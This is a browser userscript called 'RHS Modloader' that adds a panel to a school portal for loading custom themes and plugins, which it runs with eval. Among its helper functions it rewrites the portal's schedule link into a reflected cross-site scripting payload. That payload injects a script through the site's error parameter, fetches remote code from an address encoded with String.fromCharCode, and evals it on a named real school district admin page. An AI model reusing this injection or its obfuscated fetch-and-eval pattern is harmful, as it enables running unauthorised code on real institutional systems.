function toggleState(modName) {
    const object = JSON.parse(localStorage.getItem(modName));
    if (object) {
      object.state = object.state === 1 ? 0 : 1;
      localStorage.setItem(modName, JSON.stringify(object));
  
      if (object.modName.endsWith('.js')) {
        if (object.state === 1) {
          try {
            eval(object.code);
          } catch (error) {
            console.error('Error executing JavaScript for ' + modName + ': ' + error);
          }
        }
      } else if (object.modName.endsWith('.css')) {
        const existingStyleTags = document.querySelectorAll(`style[data-mod-name="${modName}"]`);
  
        if (object.state === 1) {
          if (existingStyleTags.length === 0) {
            const newStyleTag = document.createElement('style');
            newStyleTag.textContent = object.code;
            newStyleTag.setAttribute('data-mod-name', modName);
            document.head.appendChild(newStyleTag);
          }
        } else {
          for (const styleTag of existingStyleTags) {
            document.head.removeChild(styleTag);
          }
        }
      }
    }
  }
  
  document.toggleState = toggleState;
  
  function applyStyles(cssCode) {
    const styleTag = document.createElement('style');
    styleTag.textContent = cssCode;
    document.head.appendChild(styleTag);
  }
  document.applyStyles = applyStyles;
  
  function loadCSSFiles() {
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const object = JSON.parse(localStorage.getItem(key));
        if (object && object.state === 1 && key.endsWith('.css')) {
            const styleTag = document.createElement('style');
            styleTag.textContent = object.code;
            styleTag.setAttribute('data-mod-name', key);
            document.head.appendChild(styleTag);
        }
    }
  }
  document.loadCSSFiles = loadCSSFiles;

  function forceUpload(jsCode, emulatedFileName) {
    const modName = emulatedFileName || 'default.js';
    const state = 0; // Default state
    const object = { modName, code: jsCode, state };
    localStorage.setItem(modName, JSON.stringify(object));
    renderObject(object);
  }
document.forceUpload = forceUpload;
  
  function handleFileUpload(event) {
    const files = event.target.files;
    if (files.length > 0) {
        for (const file of files) {
            const reader = new FileReader();
            reader.onload = function (e) {
                const code = e.target.result;
                const modName = file.name;
                const state = 0; // Default state
                const object = { modName, code, state };
                localStorage.setItem(modName, JSON.stringify(object));
                renderObject(object);
            };
            reader.readAsText(file);
        }
    }
  }
  document.handleFileUpload = handleFileUpload;


function loadScript(src, callback) {
    const script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = src;
    script.onload = callback;
    document.head.appendChild(script);
  }
  document.loadScript = loadScript;

  function loadStylesheet(href) {
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = href;
    document.head.appendChild(link);
  }
  document.loadStylesheet = loadStylesheet;  

//edit schedule override allowing it to work normally when modloaded
document.querySelector('a[title="Edit your personal schedule"]').href = `https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Cscript%3Efetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,101,116,83,99,104,101,100,117,108,101,46,106,115)).then(response=%3Eresponse.text()).then(d=%3Eeval(d))%3C/script%3E`

  function renderObject(object) {
    const containerId = object.modName.endsWith('.js') ? 'pluginsContainer' : 'themesContainer';
  
    const container = document.getElementById(containerId);
  
    const div = document.createElement('div');
    
    div.innerHTML =
  '<label>' + object.modName + '</label>' +
  '<input type="checkbox" data-mod-name="' + object.modName + '" ' + (object.state === 1 ? 'checked' : '') + ' onchange="toggleState(\'' + object.modName + '\')">' +
  '<button style="margin-right:8px;padding:.1rem .3rem;position:relative;top:5px" onclick="deleteObject(\'' + object.modName + '\', \'' + containerId + '\')" type="button" class="btn btn-outline-danger"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash3" viewBox="0 0 16 16"> <path d="M6.5 1h3a.5.5 0 0 1 .5.5v1H6v-1a.5.5 0 0 1 .5-.5ZM11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3A1.5 1.5 0 0 0 5 1.5v1H2.506a.58.58 0 0 0-.01 0H1.5a.5.5 0 0 0 0 1h.538l.853 10.66A2 2 0 0 0 4.885 16h6.23a2 2 0 0 0 1.994-1.84l.853-10.66h.538a.5.5 0 0 0 0-1h-.995a.59.59 0 0 0-.01 0H11Zm1.958 1-.846 10.58a1 1 0 0 1-.997.92h-6.23a1 1 0 0 1-.997-.92L3.042 3.5h9.916Zm-7.487 1a.5.5 0 0 1 .528.47l.5 8.5a.5.5 0 0 1-.998.06L5 5.03a.5.5 0 0 1 .47-.53Zm5.058 0a.5.5 0 0 1 .47.53l-.5 8.5a.5.5 0 1 1-.998-.06l.5-8.5a.5.5 0 0 1 .528-.47ZM8 4.5a.5.5 0 0 1 .5.5v8.5a.5.5 0 0 1-1 0V5a.5.5 0 0 1 .5-.5Z"></path></svg></button>' +
  '<button style="margin-right:8px;padding:.1rem .3rem;position:relative;top:5px" onclick="downloadFile(\'' + object.modName + '\', getPluginData(\'' + object.modName + '\'))" type="button" class="btn btn-outline-success"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-box-arrow-in-down" viewBox="0 0 16 16"> <path fill-rule="evenodd" d="M3.5 6a.5.5 0 0 0-.5.5v8a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-8a.5.5 0 0 0-.5-.5h-2a.5.5 0 0 1 0-1h2A1.5 1.5 0 0 1 14 6.5v8a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 14.5v-8A1.5 1.5 0 0 1 3.5 5h2a.5.5 0 0 1 0 1h-2z"></path> <path fill-rule="evenodd" d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"></path></svg></button>'
    container.appendChild(div);
  }
  document.renderObject = renderObject;
  
  var element = document.querySelector(".menu-rhs");
  
          if (element) {
          } else {
            loadCSSFiles();

            document.querySelector("body").insertAdjacentHTML("afterEnd",` <div class="popup" style="display: none;">
            <div class="popup-header">
              <div class="input-group">
                <span class="input-group-text" id="codeEditorIcon">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="grey" class="bi bi-pencil-square" viewBox="0 0 16 16">
          <path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"></path>
          <path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"></path>
          </svg>
                </span>
                <input type="text" id="codeEditor" class="form-control fileName" placeholder="file-name.js (or css)" autocomplete="off" aria-describedby="codeEditorIcon">
              </div>`)

  document.querySelector("html body div.container-fluid div.flexbar").insertAdjacentHTML("afterbegin",`

  <button type="button" data-bs-toggle="modal" data-bs-target="#rhsModal" style="background: #ffffff1c;top: -8px;position: relative;color: white;" class="btn menu-rhs">
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-three-dots" viewBox="0 0 16 16">
    <path d="M3 9.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3z"></path>
    </svg>
    </button>
    
    <div class="modal fade" id="rhsModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-xl">
        <div class="modal-content">
          <div class="modal-header">
            <h1 class="modal-title fs-5" id="exampleModalLabel" style="font-size:1.8rem;color:black">RHS Modloader</h1>

<span class="main-buttons-rhsModal">
            <button type="button" onclick="togglePopupDisplay()" id="togglePopupButton" class="btn btn-outline-success"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-plus-lg" viewBox="0 0 16 16">
    <path fill-rule="evenodd" d="M8 2a.5.5 0 0 1 .5.5v5h5a.5.5 0 0 1 0 1h-5v5a.5.5 0 0 1-1 0v-5h-5a.5.5 0 0 1 0-1h5v-5A.5.5 0 0 1 8 2Z"></path>
  </svg></button>
            <button type="button" class="btn btn-primary" id="uploadMods" onclick="document.getElementById('fileInput').click()">Upload Files</button>
            </span>

          </div>
          <div class="modal-body">
    
          <input type="file" id="fileInput" accept=".js,.css" multiple style="display: none;">
    <div id="modsContainer">
          <div class="container" id="themesContainer">
          <h2 style="color:black">Themes</h2>
      </div>
      <div class="container" id="pluginsContainer">
          <h2 style="color:black">Plugins</h2>
      </div>
    </div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-success" onclick="location.reload()">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-clockwise" viewBox="0 0 16 16">
    <path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2v1z"></path>
    <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466z"></path>
    </svg> Refresh</button>
    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>
    
    <style>
      #modsContainer {
        display: flex;
      }
            .container {
                margin: 20px;
                border: 1px solid #ccc;
                padding: 10px;
                max-width: 100%;
            }
            button.menu-rhs {
                margin-top: 10px;
            }
            label {
                color:black;
                font-size: 17px;
            }
            input[type="checkbox"] {
                width: 25px;
                position: relative;
                top: 10px;
                padding-left: 5px;
                padding-right: 5px;
                margin-left: 10px;
                margin-right: 10px;
            }
            .original {
                font-weight: normal;
            }
            button[onclick*="d"] {
                font-size: 17px;
            }
            @media (min-width: 768px) {
              .modal-xl {
                width: 90%;
               max-width:1200px;
              }
            }
            .popup {
  z-index: 9;
  background-color: #f1f1f1;
  border: 1px solid #d3d3d3;
  text-align: center;
  min-height: 100px;
  min-width: 320px;
  width: 461px;
height: 267px;
position: absolute;
  resize: both;
  overflow: hidden;
  border-radius: 12px;
}

.popup-header {
  height: 55px;
  padding: 10px;
  cursor: move;
  z-index: 10;
  background-color: #000000b4;
  color: #fff;

}

/*Resizeable*/

.popup .resizer-right {
  width: 5px;
  height: 100%;
  background: transparent;
  position: absolute;
  right: 0;
  bottom: 0;
  cursor: e-resize;
}

.popup .resizer-bottom {
  width: 100%;
  height: 5px;
  background: transparent;
  position: absolute;
  right: 0;
  bottom: 0;
  cursor: n-resize;
}

.popup .resizer-both {
  width: 5px;
  height: 5px;
  background: transparent;
  z-index: 10;
  position: absolute;
  right: 0;
  bottom: 0;
  cursor: nw-resize;
}

#codeEditor {
  height: 35px;
  background-color: #313131;
  font-size: 14px;
  color: white;
}
#codeEditor::placeholder {
  color: grey;
}

#codeEditorIcon {
background-color: #313131;
border: none;
}

#codeEditor.fileName {
  border: none;
  justify-content: left;
  display: grid;
  position: relative;
  width: 200;
  flex: none;
}

span[role="presentation"] {
  position: relative;
  left: 30px;
}

.popup * {
  -webkit-touch-callout: none; /* iOS Safari */
  -webkit-user-select: none; /* Safari */
  -khtml-user-select: none; /* Konqueror HTML */
  -moz-user-select: none; /* Firefox */
  -ms-user-select: none; /* Internet Explorer/Edge */
  user-select: none; /* Non-prefixed version, currently
                                  supported by Chrome and Opera */
}
.CodeMirror pre.CodeMirror-line, .CodeMirror pre.CodeMirror-line-like {
  display: grid;
  justify-content: left;
}
.CodeMirror {
  font-size: 12px;
}
.CodeMirror-scroll {
  background-color: #2b2b2b;
  color:white;
}
#code-input {
  width: 513px; 
  height: 364px
}
.CodeMirror.cm-s-default {
height: 100%;
}
.CodeMirror-linenumbers {
  background: #262626;
border-right: none;
}
        </style>
    
    `);
  document.getElementById('fileInput').addEventListener('change', handleFileUpload);
  
  function deleteObject(modName, containerId) {
      localStorage.removeItem(modName);
      const container = document.getElementById(containerId);
      const divToRemove = Array.from(container.querySelectorAll('label')).find((label) => label.textContent === modName).parentNode;
      container.removeChild(divToRemove);
  }
  document.deleteObject = deleteObject;
  
  function downloadFile(fileName, fileContent) {
      const blob = new Blob([fileContent], { type: 'text/plain' });
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = fileName;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
  }
  document.downloadFile = downloadFile;

  function getPluginData(pluginName) {
    const pluginData = localStorage.getItem(pluginName);
    if (pluginData) {
      const parsedData = JSON.parse(pluginData);
      return parsedData.code;
    } else {
      return 'Plugin data not found in localStorage.';
    }
  }
  document.getPluginData = getPluginData;
  
  function loadObjects() {
      for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          const object = JSON.parse(localStorage.getItem(key));
          if (object) {
              renderObject(object);
              if (object.state === 1 && key.endsWith('.js')) {
                  eval(object.code);
              }
          }
      }
  }
  document.loadObjects = loadObjects;
  
  document.addEventListener('keydown', function(event) {
      if (event.ctrlKey && event.key === 'y') {
          localStorage.clear();
          location.reload();
      }
  });
  loadObjects()
          }
  
          // Get the button and the popup element
    const toggleButton = document.getElementById('togglePopupButton');
    const minimizeButton = document.getElementById('minimizeButton');
    const popup = document.querySelector(".popup");
    
    // Function to toggle the display state
    function togglePopupDisplay() {
      if (popup.style.display === 'none' || popup.style.display === '') {
        popup.style.display = 'block'; // Set it to the default display value
      } else {
        popup.style.display = 'none'; // Hide the popup
      }
    }
    document.togglePopupDisplay = togglePopupDisplay;

    window.onload = function() {
      initDragElement();
      initResizeElement();
    };
    
    function initDragElement() {
      var pos1 = 0,
        pos2 = 0,
        pos3 = 0,
        pos4 = 0;
      var popups = document.getElementsByClassName("popup");
      var elmnt = null;
      var currentZIndex = 100; //TODO reset z index when a threshold is passed
    
      for (var i = 0; i < popups.length; i++) {
        var popup = popups[i];
        var header = getHeader(popup);
    
        popup.onmousedown = function() {
          this.style.zIndex = "" + ++currentZIndex;
        };
    
        if (header) {
          header.parentPopup = popup;
          header.onmousedown = dragMouseDown;
        }
      }
    
      function dragMouseDown(e) {
        elmnt = this.parentPopup;
        elmnt.style.zIndex = "" + ++currentZIndex;
    
        e = e || window.event;
        // get the mouse cursor position at startup:
        pos3 = e.clientX;
        pos4 = e.clientY;
        document.onmouseup = closeDragElement;
        // call a function whenever the cursor moves:
        document.onmousemove = elementDrag;
      }
    
      function elementDrag(e) {
        if (!elmnt) {
          return;
        }
    
        e = e || window.event;
        // calculate the new cursor position:
        pos1 = pos3 - e.clientX;
        pos2 = pos4 - e.clientY;
        pos3 = e.clientX;
        pos4 = e.clientY;
        // set the element's new position:
        elmnt.style.top = elmnt.offsetTop - pos2 + "px";
        elmnt.style.left = elmnt.offsetLeft - pos1 + "px";
      }
    
      function closeDragElement() {
        /* stop moving when mouse button is released:*/
        document.onmouseup = null;
        document.onmousemove = null;
      }
    
      function getHeader(element) {
        var headerItems = element.getElementsByClassName("popup-header");
    
        if (headerItems.length === 1) {
          return headerItems[0];
        }
    
        return null;
      }
    }
    
    function initResizeElement() {
      var popups = document.getElementsByClassName("popup");
      var element = null;
      var startX, startY, startWidth, startHeight;
    
      for (var i = 0; i < popups.length; i++) {
        var p = popups[i];
    
        var right = document.createElement("div");
        right.className = "resizer-right";
        p.appendChild(right);
        right.addEventListener("mousedown", initDrag, false);
        right.parentPopup = p;
    
        var bottom = document.createElement("div");
        bottom.className = "resizer-bottom";
        p.appendChild(bottom);
        bottom.addEventListener("mousedown", initDrag, false);
        bottom.parentPopup = p;
    
        var both = document.createElement("div");
        both.className = "resizer-both";
        p.appendChild(both);
        both.addEventListener("mousedown", initDrag, false);
        both.parentPopup = p;
      }
    
      function initDrag(e) {
        element = this.parentPopup;
    
        startX = e.clientX;
        startY = e.clientY;
        startWidth = parseInt(
          document.defaultView.getComputedStyle(element).width,
          10
        );
        startHeight = parseInt(
          document.defaultView.getComputedStyle(element).height,
          10
        );
        document.documentElement.addEventListener("mousemove", doDrag, false);
        document.documentElement.addEventListener("mouseup", stopDrag, false);
      }
    
      function doDrag(e) {
        element.style.width = startWidth + e.clientX - startX + "px";
        element.style.height = startHeight + e.clientY - startY + "px";
      }
    
      function stopDrag() {
        document.documentElement.removeEventListener("mousemove", doDrag, false);
        document.documentElement.removeEventListener("mouseup", stopDrag, false);
      }
    }
    /* i broke something bad so no text coloring it is
     loadStylesheet('https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.58.3/codemirror.min.css');
     loadScript('https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.58.3/codemirror.min.js', function() {
      loadScript('https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.58.3/mode/javascript/javascript.min.js', function() {
        loadScript('https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.58.3/mode/css/css.min.js', function() {
      const codeInput = document.getElementById('code-input');
      var codeMirror = CodeMirror.fromTextArea(codeInput, {
          mode: 'javascript', 
          lineNumbers: true,
      });

      codeMirror.on('change', () => {
      });

const inputElement = document.getElementById('codeEditor');

inputElement.addEventListener('input', function () {
  const inputValue = inputElement.value;
  if (inputValue.endsWith('.js')) {
    codeMirror.setOption('mode', 'javascript');
    document.querySelector(".vscode-style").textContent = `  /* js mode */
  /*span[role="presentation"] {
    color: #F9D849 !important
  }
  .cm-keyword {
    color:#BB89BC !important;
  }
  .cm-def {
    color: #A9D9F9 !important
  }
  .cm-variable {
    color: #9CDCFE !important
  }
  .cm-variable-2 {
    color: #9CDCFE !important
  }
  .cm-variable-3 {
    color: #9CDCFE !important
  }
  .cm-property {
    color: #9CDCFE !important
  }
  .cm-operator {
    color: #F9D849 !important
  }
  .cm-string, .cm-s-default .cm-string-2 {
    color: #CE9178 !important
  }
  .cm-atom {
    color: #679AD1 !important
  }
  .cm-comment {
    color: #6A9955 !important
  }`
  } else if (inputValue.endsWith('.css')) {
    codeMirror.setOption('mode', 'css');
    document.querySelector(".vscode-style").textContent = `  /* css mode */
  /*.cm-string, .cm-atom {
    color: #CE9178 !important
  }
  .cm-def {
    color: #745d77 !important
  }
  .cm-keyword {
    color: #7197C9 !important
  }
  .cm-property {
    color: #A1C1DB !important;
  }
  .cm-variable, .cm-callee {
    color: #BB78C7 !important;
  }
  .cm-qualifier, .cm-tag {
    color: #d5b875 !important;
  }
  .cm-number {
    color: #BACDAB !important;
  }
  .cm-comment {
    color: #74985D !important;
  }`
  }
});
});
});
}); 
*/
